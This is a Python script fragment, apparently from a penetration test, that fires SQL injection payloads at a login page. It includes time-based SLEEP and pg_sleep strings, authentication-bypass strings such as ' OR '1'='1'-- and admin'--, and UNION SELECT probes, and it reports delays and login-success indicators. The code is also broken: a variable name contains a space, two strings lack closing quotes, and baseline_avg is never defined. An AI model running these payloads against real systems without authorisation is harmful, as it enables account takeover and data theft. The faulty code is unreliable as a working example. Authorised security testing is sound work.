time_based payloads = [
    "admin' OR SLEEP(3)--",
    "admin' UNION SELECT SLEEP(3)--",
    "' OR IF(1=1,SLEEP(3),0)--",
    "test' OR pg_sleep(3)--",
]

auth_bypass_payloads = [
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1--",
    "' OR 1=1 LIMIT 1--",
]

union_payloads = [
    "' UNION SELECT 1,2--",
    "' UNION SELECT NULL,NULL--",
]

print("[=== TIME-BASED SQLi TESTS ===]")
time_anomalies = []
for payload in time_based_payloads:
    print(f"\nTesting: {payload[:50]}...")
    
    # Test username field
    result = send_raw_http_request("POST", "/login.php", {"username": payload, "password": ""})
    print(f"  Username field: {result.get('response_time', 0):.3f}s")
    if result.get('response_time', 0) >= 3.0:
        time_anomalies.append({"payload": payload, "field": "username", "delay": result['response_time']})
    
    # Test password field
    result = send_raw_http_request("POST", "/login.php", {"username": "", "password": payload})
    print(f"  Password field: {result.get('response_time', 0):.3f}s")
    if result.get('response_time', 0) >= 3.0:
        time_anomalies.append({"payload": payload, "field": "password", "delay": result['response_time']})
    
    time.sleep(0.3)

print("\n[=== AUTH BYPASS TESTS ===]
successful_bypasses = []
for payload in auth_bypass_payloads:
    print(f"\nTesting: {payload[:50]}...")
    
    result = send_raw_http_request("POST", "/login.php", {"username": payload, "password": ""})
    print(f"  Status: {result.get('status_code', 'ERR')} | Time: {result.get('response_time', 0):.3f}s")
    print(f"  Body length: {len(result.get('body', ''))} bytes")
    
    body = result.get('body', '').lower()
    if any(indicator in body for indicator in ["welcome", "dashboard", "logged in", "success"]):
        successful_bypasses.append({"payload": payload, "type": "auth_bypass", "response": result})
        print("  [!] SUCCESS INDICATOR FOUND!")
    
    time.sleep(0.3)

print("\n[=== UNION-BASED TESTS ===]
for payload in union_payloads:
    print(f"\nTesting: {payload[:50]}...")
    result = send_raw_http_request("POST", "/login.php", {"username": payload, "password": ""})
    print(f"  Status: {result.get('status_code', 'ERR')} | Time: {result.get('response_time', 0):.3f}s")
    print(f"  Body snippet: {result.get('body', '')[:100]}...")
    
    time.sleep(0.3)

# Results
print("\n" + "="*80)
print("TEST RESULTS")
print("="*80)

print(f"\nBaseline response time: {baseline_avg:.3f}s")

if time_anomalies:
    print(f"\n[!] TIME-BASED SQLI DETECTED:")
    for anomaly in time_anomalies:
        print(f"  Delay: {anomaly['delay']:.2f}s | Field: {anomaly['field']}")
        print(f"  Payload: {anomaly['payload']}")
else:
    print("\n[+] No time-based SQLi detected")

if successful_bypasses:
    print(f"\n[!] POTENTIAL AUTH BYPASS:")
    for bypass in successful_bypasses:
        print(f"  Payload: {bypass['payload']}")
        print(f"  Status: {bypass['response'].get('status_code')}")
else:
    print("\n[+] No obvious auth bypass detected")

print("\n[+] Testing completed successfully")
